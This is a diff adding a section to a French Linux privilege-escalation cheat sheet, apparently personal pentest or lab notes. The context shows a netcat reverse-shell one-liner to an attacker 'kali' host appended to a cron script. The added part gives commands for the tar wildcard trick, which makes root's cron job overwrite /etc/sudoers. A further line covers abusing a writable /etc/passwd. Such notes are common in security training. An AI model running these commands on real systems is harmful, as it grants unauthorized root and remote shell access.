@@ -276,6 +276,19 @@ echo >> user_backups.sh
 echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <kali-ip> 4444 >/tmp/f" >> user_backups.sh
 ```
 
+**Tar Wildcard Privilege Escalation**
+
+**Condition** : cron root exécute `tar` avec `*` dans un dossier writable.
+**Mécanisme** : le shell expand `*` en noms de fichiers → les fichiers nommés `--option` sont interprétés comme des flags tar.
+
+```bash
+echo "" > '--checkpoint=1'
+echo "" > '--checkpoint-action=exec=sh shell.sh'
+echo "echo '<USERNAME> ALL=(root) NOPASSWD: ALL' > /etc/sudoers" > shell.sh
+```
+
+**Résultat** : au prochain cron, tar exécute `shell.sh` en root → sudoers écrasé → privesc.
+
 ### Abusing password authentication
 
 Si `/etc/passwd` est world-writable, on peut y ajouter un compte root arbitraire - le hash dans la deuxième colonne prend la priorité sur `/etc/shadow`.
